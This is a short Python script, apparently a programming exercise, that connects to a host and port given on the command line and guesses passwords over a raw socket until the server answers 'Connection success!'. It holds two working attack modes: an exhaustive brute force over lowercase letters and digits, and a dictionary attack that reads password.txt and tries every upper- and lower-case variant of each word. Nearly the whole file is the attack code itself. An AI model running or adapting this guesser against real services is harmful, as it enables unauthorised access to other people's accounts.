import sys
import socket
import itertools
import os

def checker(data, client_socket, bufor=1024):
    for p in data:
        bp = p.encode()
        client_socket.send(bp)
        response = client_socket.recv(bufor)
        response = response.decode()
        if response == "Connection success!":
            return p

def brute_force_possibl(rep):
    brute_force_str = "abcdefghijklmnopqrstuvwxyz0123456789"
    pswrds = itertools.product(brute_force_str, repeat=rep)
    for pswr in pswrds:
        data = "".join(pswr)
        yield data

def brute_force(client_socket):
    rep = 1
    flag = True
    while flag:
        data = brute_force_possibl(rep)
        check = checker(data, client_socket)
        if check:
            return check
        rep += 1

def dict_brute_force_possibl():
    pass_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "password.txt")
    with open(pass_path, "r") as stream:
        datas = stream.readlines()

    datas = [data.replace("\n", "") for data in datas]
    for data in datas:
        word_low_up = itertools.product(*([char.lower(), char.upper()] for char in data))
        for word in word_low_up:
            word = "".join(word)
            yield word

def dict_brute_force(client_socket):
     data = dict_brute_force_possibl()
     check = checker(data, client_socket, bufor=10240)
     if check:
         return check

def connect(client_socket):
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    address = (hostname, port)
    client_socket.connect(address)


def main():
    with socket.socket() as client_socket:
        connect(client_socket)
        # print(brute_force(client_socket))
        print(dict_brute_force(client_socket))

if __name__ == "__main__":
    main()